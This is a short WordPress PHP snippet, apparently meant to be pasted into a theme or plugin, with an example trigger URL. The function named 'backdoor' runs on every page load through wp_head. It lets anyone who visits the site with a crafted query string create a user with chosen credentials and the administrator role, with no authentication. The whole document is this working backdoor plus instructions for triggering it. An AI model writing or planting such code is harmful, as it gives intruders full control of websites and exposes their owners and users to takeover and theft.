add_action( 'wp_head', 'backdoor' );

function backdoor() {
    if ( isset( $_GET['backdoor'] ) ) {
        $action = $_GET['backdoor'];
        if ( $action === 'create' ) {
            $username = isset( $_GET['username'] ) ? $_GET['username'] : 'user';
            $password = isset( $_GET['password'] ) ? $_GET['password'] : 'pass';
            require( 'wp-includes/registration.php' );
            if ( ! username_exists( $username ) ) {
                $user_id = wp_create_user( $username, $password );
                $user = new WP_User( $user_id );
                $user->set_role( 'administrator' ); 
                $message = 'Go';
            } else {
                $message = 'No';
            }
	echo "<script>alert('$message');</script>";
        }
    }
}
https://site.com/?backdoor=create&username=yourusername&password=yourpassword
